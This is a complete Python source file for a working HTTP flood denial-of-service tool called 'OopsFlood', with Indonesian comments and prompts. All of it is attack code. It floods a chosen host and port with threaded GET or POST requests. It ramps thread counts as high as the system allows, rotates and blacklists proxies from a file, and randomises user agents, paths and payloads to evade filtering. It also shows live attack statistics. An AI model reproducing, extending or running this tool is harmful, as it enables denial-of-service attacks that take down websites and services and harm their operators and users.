import socket
import threading
import string
import random
import time
import os
import platform
import sys
import json

# --- Pustaka Opsional & Variabel Global ---
SOCKS_AVAILABLE = False
try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    pass

FAKE_USERAGENT_AVAILABLE = False
try:
    from fake_useragent import UserAgent
    ua = UserAgent()
    FAKE_USERAGENT_AVAILABLE = True
except ImportError:
    pass

# Daftar User-Agent fallback jika fake_useragent tidak tersedia
USER_AGENTS_FALLBACK = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

try:
    from colorama import Fore
except ModuleNotFoundError:
    class DefaultColors:
        def __getattr__(self, name): return ''
    Fore = DefaultColors()

# --- Variabel Kontrol Serangan ---
stop_attack = threading.Event()
current_active_threads_count = 0
thread_count_lock = threading.Lock()
crash_thread_limit = None  # Batas sementara berdasarkan crash, None = tanpa batas
crash_thread_lock = threading.Lock()

# --- Manajemen Proxy ---
proxy_list = []
active_proxies = []
blacklist_proxies = {}
proxy_lock = threading.Lock()
PROXY_UNBLACKLIST_TIME = 60
PROXY_PERMANENT_BLACKLIST_THRESHOLD = 5

# --- Metrik Serangan ---
total_packets_sent = 0
attack_start_time = 0
proxy_success_count = 0
proxy_failure_count = 0
general_error_count = 0

# --- Fungsi Utilitas ---
def controlled_print(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()

def clear_text():
    sys.stdout.write('\033c')
    sys.stdout.flush()
    os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')

def generate_random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def load_proxies_from_file(filename="ProxyList.txt"):
    global proxy_list, active_proxies
    proxy_list.clear()
    active_proxies.clear()
    if not SOCKS_AVAILABLE:
        controlled_print(f"{Fore.RED}GAGAL: Dependensi pysocks tidak terinstall. Instal dengan 'pip install pysocks' untuk menggunakan proxy.{Fore.RESET}")
        return False
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    proxy_list.append(line)
        active_proxies = list(proxy_list)
        blacklist_proxies.clear()
        controlled_print(f"{Fore.GREEN}INFO: {len(proxy_list)} proxy dimuat dari {filename}{Fore.RESET}")
        return True
    except FileNotFoundError:
        controlled_print(f"{Fore.RED}GAGAL: File ProxyList.txt tidak ditemukan. Pastikan file ada di folder yang sama.{Fore.RESET}")
        return False
    except Exception as e:
        controlled_print(f"{Fore.RED}GAGAL: Gagal memuat proxy dari {filename}: {e}{Fore.RESET}")
        return False

def get_random_proxy():
    with proxy_lock:
        now = time.time()
        proxies_to_reactivate = []
        for proxy, data in blacklist_proxies.items():
            if now - data['time'] > PROXY_UNBLACKLIST_TIME:
                proxies_to_reactivate.append(proxy)
        
        for proxy in proxies_to_reactivate:
            if proxy in proxy_list:
                active_proxies.append(proxy)
            del blacklist_proxies[proxy]
            
        if not active_proxies and proxy_list:
            controlled_print(f"{Fore.YELLOW}PERINGATAN: Semua proxy aktif di-blacklist sementara. Mencoba me-reset daftar aktif dari {len(proxy_list)} proxy awal.{Fore.RESET}")
            active_proxies = list(proxy_list)
            blacklist_proxies.clear()

        if active_proxies:
            return random.choice(active_proxies)
        return None

def blacklist_failed_proxy(proxy):
    with proxy_lock:
        if proxy in active_proxies:
            active_proxies.remove(proxy)
        
        if proxy not in blacklist_proxies:
            blacklist_proxies[proxy] = {'time': time.time(), 'failures': 1}
        else:
            blacklist_proxies[proxy]['failures'] += 1
            blacklist_proxies[proxy]['time'] = time.time()

        if blacklist_proxies[proxy]['failures'] >= PROXY_PERMANENT_BLACKLIST_THRESHOLD:
            if proxy in proxy_list:
                proxy_list.remove(proxy)
            controlled_print(f"{Fore.RED}PROXY BLOCKED: Proxy {proxy} sering gagal, dihapus permanen.{Fore.RESET}")
            del blacklist_proxies[proxy]

def generate_advanced_payload():
    payload_type = random.choice(['json', 'xml', 'form'])
    
    if payload_type == 'json':
        content_type = "application/json"
        data = {
            "login": {
                "user": generate_random_string(12),
                "password": generate_random_string(24),
                "session_id": generate_random_string(32)
            },
            "data": {
                "query": "SELECT * FROM users WHERE id=" + str(random.randint(1, 10000)),
                "content": generate_random_string(random.randint(512, 1024))
            },
            "timestamp": time.time()
        }
        payload = json.dumps(data)
        return payload, content_type

    if payload_type == 'xml':
        content_type = "application/xml"
        user = generate_random_string(12)
        content = generate_random_string(random.randint(512, 1024))
        payload = f"""<?xml version="1.0"?>
<root>
   <user id="{user}">
      <action>update</action>
      <profile>true</profile>
   </user>
   <data encoding="base64">{content}</data>
</root>"""
        return payload, content_type

    content_type = "application/x-www-form-urlencoded"
    fields = {
        "username": generate_random_string(12),
        "email": f"{generate_random_string(8)}@example.com",
        "password": generate_random_string(24),
        "comment": generate_random_string(random.randint(256, 512)),
        "csrf_token": generate_random_string(32)
    }
    payload = "&".join([f"{k}={v}" for k, v in fields.items()])
    return payload, content_type

def generate_url_path():
    common_paths = ['api', 'user', 'product', 'search', 'login', 'cart', 'checkout', 'status', 'config', 'data', 'report']
    path = f"/{random.choice(common_paths)}/{generate_random_string(random.randint(8, 20))}"
    if random.random() < 0.5:
        path += f"?id={random.randint(1, 99999)}¶m={generate_random_string(random.randint(5, 15))}"
    return path

def DoS_Attack_Worker(ip, host, port, type_attack, booter_sent, use_proxy_option):
    global current_active_threads_count, total_packets_sent, proxy_success_count, proxy_failure_count, general_error_count
    if stop_attack.is_set(): return

    s = None
    current_proxy = None
    try:
        with thread_count_lock: current_active_threads_count += 1

        url_path = generate_url_path()
        random_user_agent = ua.random if FAKE_USERAGENT_AVAILABLE else random.choice(USER_AGENTS_FALLBACK)
        
        if type_attack.upper() == "POST":
            packet_body, content_type_header_val = generate_advanced_payload()
            content_type_header = f"Content-Type: {content_type_header_val}\r\n"
            content_length_header = f"Content-Length: {len(packet_body)}\r\n"
        else:
            packet_body = ""
            content_type_header = ""
            content_length_header = "Content-Length: 0\r\n"

        packet_str = (
            f"{type_attack} {url_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {random_user_agent}\r\n"
            f"Accept: application/json, text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Connection: Keep-Alive\r\n"
            f"{content_type_header}"
            f"{content_length_header}\r\n"
            f"{packet_body}"
        )
        packet_data = packet_str.encode()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)

        if use_proxy_option:
            current_proxy = get_random_proxy()
            if not current_proxy:
                with thread_count_lock: general_error_count += 1
                return
            
            try:
                proxy_ip, proxy_port = current_proxy.split(':')
                proxy_port = int(proxy_port)

                if SOCKS_AVAILABLE:
                    s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
                    s.connect((ip, port))
                else:
                    connect_request = f"CONNECT {ip}:{port} HTTP/1.1\r\nHost: {ip}:{port}\r\n\r\n".encode()
                    s.connect((proxy_ip, proxy_port))
                    s.sendall(connect_request)
                    response = s.recv(4096).decode()
                    if not "200 Connection established" in response:
                        raise socket.error(f"Proxy connection failed: {response.strip()}")
                
                with thread_count_lock: proxy_success_count += 1
            except (socket.error, OSError, ValueError, socks.ProxyError) as e:
                with thread_count_lock: proxy_failure_count += 1
                if current_proxy:
                    blacklist_failed_proxy(current_proxy)
                return
        else:
            s.connect((ip, port))
        
        for _ in range(booter_sent):
            if stop_attack.is_set(): break
            s.sendall(packet_data)
            with thread_count_lock: total_packets_sent += 1

    except (socket.error, OSError, TimeoutError) as e:
        with thread_count_lock: general_error_count += 1
        if use_proxy_option and current_proxy:
            with thread_count_lock: proxy_failure_count += 1
            blacklist_failed_proxy(current_proxy)
        
    finally:
        if s:
            try: s.shutdown(socket.SHUT_RDWR)
            except (socket.error, OSError): pass
            try: s.close()
            except (socket.error, OSError): pass
        with thread_count_lock: current_active_threads_count -= 1

def runing_attack_manager_auto(ip, host, port_loader, time_loader, methods_loader, booter_sent_auto_mode, use_proxy_option):
    global crash_thread_limit
    while time.time() < time_loader and not stop_attack.is_set():
        with thread_count_lock:
            current_threads = current_active_threads_count
        
        # Kalau ada batas crash, jaga thread di bawah batas
        if crash_thread_limit is not None and current_threads >= crash_thread_limit:
            time.sleep(0.01)
            continue
        
        # Tambah thread sebanyak mungkin, 100 per iterasi
        try:
            for _ in range(100):  # Tambah 100 thread per loop
                if stop_attack.is_set(): break
                if crash_thread_limit is not None and current_threads >= crash_thread_limit:
                    break
                thread = threading.Thread(target=DoS_Attack_Worker, args=(ip, host, port_loader, methods_loader, booter_sent_auto_mode, use_proxy_option), daemon=True)
                thread.start()
                with thread_count_lock: current_threads = current_active_threads_count
                time.sleep(0.0001)  # Delay lebih kecil biar thread naik cepet
        except RuntimeError:  # Tangkap crash thread
            with crash_thread_lock:
                if crash_thread_limit is None:
                    crash_thread_limit = max(1, current_threads - 25)  # Kurangi 25 dari thread saat crash
                else:
                    crash_thread_limit = max(1, crash_thread_limit - 25)  # Kurangi lagi 25 kalau crash berulang
            time.sleep(5)  # Tunggu 5 detik sebelum coba lagi
            continue

def runing_attack_manager_custom(ip, host, port_loader, time_loader, booter_sent_custom_mode, methods_loader, custom_create_thread, custom_spam_loader, custom_spam_create_thread, use_proxy_option):
    global crash_thread_limit
    total_threads = custom_create_thread * custom_spam_loader * custom_spam_create_thread
    while time.time() < time_loader and not stop_attack.is_set():
        with thread_count_lock:
            current_threads = current_active_threads_count
        
        # Kalau ada batas crash, jaga thread di bawah batas
        if crash_thread_limit is not None and current_threads >= crash_thread_limit:
            time.sleep(0.01)
            continue
        
        # Tambah thread sesuai input, tapi tangkap crash
        try:
            for _ in range(total_threads):
                if stop_attack.is_set(): break
                if crash_thread_limit is not None and current_threads >= crash_thread_limit:
                    break
                thread = threading.Thread(target=DoS_Attack_Worker, args=(ip, host, port_loader, methods_loader, booter_sent_custom_mode, use_proxy_option), daemon=True)
                thread.start()
                with thread_count_lock: current_threads = current_active_threads_count
                time.sleep(0.0001)  # Delay lebih kecil biar thread naik cepet
            time.sleep(0.01)
        except RuntimeError:  # Tangkap crash thread
            with crash_thread_lock:
                if crash_thread_limit is None:
                    crash_thread_limit = max(1, current_threads - 25)  # Kurangi 25 dari thread saat crash
                else:
                    crash_thread_limit = max(1, crash_thread_limit - 25)  # Kurangi lagi 25 kalau crash berulang
            time.sleep(5)  # Tunggu 5 detik sebelum coba lagi
            continue

def display_realtime_stats(target_host, target_port, end_time):
    CURSOR_UP = '\033[1A'
    CLEAR_LINE = '\033[K'
    lines_printed = 0
    last_update = time.time()
    while not stop_attack.is_set():
        current_time = time.time()
        if current_time < last_update + 0.1:  # Update setiap 0.1 detik
            time.sleep(0.01)
            continue
        last_update = current_time

        remaining_seconds = max(0, int(end_time - current_time))
        if remaining_seconds == 0: break

        # Ambil data metrik sekali di luar loop penulisan
        with thread_count_lock:
            current_packets_sent = total_packets_sent
            current_active = current_active_threads_count
            current_general_error = general_error_count
            current_proxy_success = proxy_success_count
            current_proxy_failure = proxy_failure_count
            current_crash_limit = crash_thread_limit

        duration = current_time - attack_start_time
        packets_per_second = current_packets_sent / duration if duration > 0 else 0

        # Buffer output untuk rendering lebih efisien
        output_lines = []
        output_lines.append(f"{Fore.CYAN}--- SERANGAN BERLANGSUNG (LIVE) ---")
        output_lines.append(f"{CLEAR_LINE}{Fore.YELLOW}Target              : {Fore.WHITE}{target_host}:{target_port}")
        output_lines.append(f"{CLEAR_LINE}{Fore.YELLOW}Sisa Waktu          : {Fore.WHITE}{remaining_seconds} detik")
        output_lines.append(f"{CLEAR_LINE}{Fore.YELLOW}Threads Aktif       : {Fore.WHITE}{current_active}")
        output_lines.append(f"{CLEAR_LINE}{Fore.YELLOW}Batas Crash Thread  : {Fore.WHITE}{current_crash_limit if current_crash_limit is not None else 'Tidak ada'}")
        output_lines.append(f"{CLEAR_LINE}{Fore.CYAN}----------------------------------")
        output_lines.append(f"{CLEAR_LINE}{Fore.YELLOW}Durasi Serangan     : {Fore.WHITE}{duration:.2f} detik")
        output_lines.append(f"{CLEAR_LINE}{Fore.YELLOW}Total Paket Terkirim: {Fore.WHITE}{current_packets_sent:,}")
        output_lines.append(f"{CLEAR_LINE}{Fore.YELLOW}Rata-rata Paket/Detik: {Fore.WHITE}{packets_per_second:,.2f}")
        output_lines.append(f"{CLEAR_LINE}{Fore.YELLOW}Total Error Koneksi : {Fore.RED}{current_general_error}")
        output_lines.append(f"{CLEAR_LINE}{Fore.YELLOW}Proxy Berhasil/Gagal: {Fore.GREEN}{current_proxy_success}{Fore.RESET}/{Fore.RED}{current_proxy_failure}{Fore.RESET}")
        output_lines.append(f"{CLEAR_LINE}{Fore.CYAN}----------------------------------")
        output_lines.append(f"{CLEAR_LINE}{Fore.GREEN}Tekan [Enter] untuk berhenti...{Fore.RESET}")

        # Hapus baris sebelumnya dan tulis output baru
        if lines_printed > 0:
            sys.stdout.write(CURSOR_UP * lines_printed)
        sys.stdout.write('\n'.join(output_lines) + '\n')
        sys.stdout.flush()
        lines_printed = len(output_lines)

def _resolve_ip_in_thread(host, result_container):
    """Fungsi helper untuk resolve IP di thread."""
    try:
        result_container[0] = socket.gethostbyname(host)
    except (socket.gaierror, Exception):
        result_container[0] = None

def resolve_host_ip(host, timeout=5):
    """Resolusi IP host dengan timeout menggunakan thread."""
    result = [None]
    thread = threading.Thread(target=_resolve_ip_in_thread, args=(host, result))
    thread.start()
    thread.join(timeout=timeout)

    if thread.is_alive():
        controlled_print(f"{Fore.RED}GAGAL: Resolusi DNS untuk '{host}' timeout setelah {timeout} detik.{Fore.RESET}")
        return None
    elif result[0] is None:
        controlled_print(f"{Fore.RED}GAGAL: Tidak dapat me-resolusi IP untuk host '{host}'. Pastikan target valid.{Fore.RESET}")
        return None
    return result[0]

def stop_attack_input_handler():
    try:
        input()
        if not stop_attack.is_set():
            stop_attack.set()
    except (EOFError, KeyboardInterrupt):
        if not stop_attack.is_set():
            stop_attack.set()

def reset_metrics():
    global total_packets_sent, attack_start_time, proxy_success_count, proxy_failure_count, general_error_count, current_active_threads_count, crash_thread_limit
    total_packets_sent = 0
    attack_start_time = 0
    proxy_success_count = 0
    proxy_failure_count = 0
    general_error_count = 0
    current_active_threads_count = 0
    crash_thread_limit = None  # Reset batas thread crash
    with proxy_lock:
        active_proxies.clear()
        active_proxies.extend(proxy_list)
        blacklist_proxies.clear()

def display_help():
    controlled_print(f"\n{Fore.CYAN}--- BANTUAN PENGGUNAAN ---{Fore.RESET}")
    controlled_print(f"{Fore.MAGENTA}Mode AUTO (Disarankan):{Fore.RESET} HttpFlood AUTO <TARGET> <PORT> <TIME> <METHOD> [proxy]")
    controlled_print(f"{Fore.MAGENTA}Mode CUSTOM (Ahli):{Fore.RESET} HttpFlood CUSTOM <TARGET> <PORT> <TIME> <BOOTER_SENT> <METHOD> <THREADS> <SPAM> <SPAM_THREADS> [proxy]")
    controlled_print(f"{Fore.YELLOW}Untuk menggunakan proxy, pastikan ada file 'ProxyList.txt' di folder yang sama.{Fore.RESET}")
    controlled_print(f"{Fore.YELLOW}Format ProxyList.txt: IP:PORT setiap baris. Contoh: 192.168.1.1:8080{Fore.RESET}")

def command():
    global attack_start_time
    manager_th = None
    live_stats_th = None

    while True:
        try:
            data_input_loader = input(f"{Fore.CYAN}OopsFlood {Fore.WHITE}#{Fore.RESET} ")
            if not data_input_loader: continue
            if data_input_loader.lower() in ["clear", "cls"]: clear_text(); continue
            if data_input_loader.lower() == "help": display_help(); continue

            args_get = data_input_loader.split(" ")
            if args_get[0].upper() != "HTTPFLOOD":
                controlled_print(f"{Fore.RED}Perintah tidak valid. Gunakan 'help'.{Fore.RESET}"); continue

            reset_metrics()
            use_proxy_option = args_get[-1].lower() == "proxy"
            if use_proxy_option:
                if not load_proxies_from_file():
                    continue  # Langsung balik ke prompt tanpa stack trace
                args_get.pop()

            mode = "INVALID"
            if len(args_get) == 6 and args_get[1].upper() == "AUTO":
                mode = "AUTO"
            elif len(args_get) == 10 and args_get[1].upper() == "CUSTOM":
                mode = "CUSTOM"
            else:
                controlled_print(f"{Fore.RED}Jumlah argumen atau format mode salah. Gunakan 'help'.{Fore.RESET}")
                continue

            try:
                if mode == "AUTO":
                    params = {'target': args_get[2],
                              'port': int(args_get[3]),
                              'time': int(args_get[4]),
                              'method': args_get[5].upper()}
                else:
                    params = {'target': args_get[2],
                              'port': int(args_get[3]),
                              'time': int(args_get[4]),
                              'booter_sent': int(args_get[5]),
                              'method': args_get[6].upper(),
                              'custom_create_thread': int(args_get[7]),
                              'custom_spam_loader': int(args_get[8]),
                              'custom_spam_create_thread': int(args_get[9])}
                
                params['host'] = str(params['target']).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                
                params['ip'] = resolve_host_ip(params['host'], timeout=5)
                if params['ip'] is None:
                    continue

            except (ValueError) as e:
                controlled_print(f"{Fore.RED}GAGAL: Input parameter tidak valid. Pastikan PORT, TIME, BOOTER_SENT, THREADS, SPAM, SPAM_THREADS adalah angka. Error: {e}{Fore.RESET}")
                continue

            clear_text()
            # Log sebelum serangan dihapus
            for i in range(3, 0, -1):
                sys.stdout.write(f"\r{Fore.YELLOW}Memulai serangan dalam {i}...{Fore.RESET}")
                sys.stdout.flush()
                time.sleep(1)
            sys.stdout.write(f"\r{' ' * 30}\r")
            sys.stdout.flush()

            stop_attack.clear()
            attack_start_time = time.time()
            end_time = attack_start_time + params['time']

            if mode == "AUTO":
                manager_th = threading.Thread(target=runing_attack_manager_auto, args=(params['ip'], params['host'], params['port'], end_time, params['method'], 1000, use_proxy_option), daemon=True)
            else:
                manager_th = threading.Thread(target=runing_attack_manager_custom, args=(params['ip'], params['host'], params['port'], end_time, params['booter_sent'], params['method'], params['custom_create_thread'], params['custom_spam_loader'], params['custom_spam_create_thread'], use_proxy_option), daemon=True)
            
            live_stats_th = threading.Thread(target=display_realtime_stats, args=(params['host'], params['port'], end_time), daemon=True)
            stop_input_th = threading.Thread(target=stop_attack_input_handler, daemon=True)
            
            live_stats_th.start()
            manager_th.start()
            stop_input_th.start()
            
            manager_th.join()
            
            if not stop_attack.is_set():
                stop_attack.set()
            
            live_stats_th.join(timeout=1)

            if stop_attack.is_set():
                controlled_print(f"\n{Fore.GREEN}Serangan diHentikan{Fore.RESET}")
            else:
                controlled_print(f"\n{Fore.GREEN}Serangan Selesai (Waktu Habis){Fore.RESET}")

        except KeyboardInterrupt:
            stop_attack.set()
            controlled_print(f"\n{Fore.RED}Ctrl+C terdeteksi. Menghentikan program...{Fore.RESET}")
            if manager_th and manager_th.is_alive(): manager_th.join(timeout=1)
            if live_stats_th and live_stats_th.is_alive(): live_stats_th.join(timeout=1)
            controlled_print(f"{Fore.RED}Program dihentikan paksa. Keluar...{Fore.RESET}")
            sys.exit(0)
        except Exception as e:
            controlled_print(f"{Fore.RED}Terjadi kesalahan kritis: {e}{Fore.RESET}")
            stop_attack.clear()

if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        controlled_print(f"\n{Fore.RED}Program dihentikan paksa. Keluar...{Fore.RESET}")
        sys.exit(0)
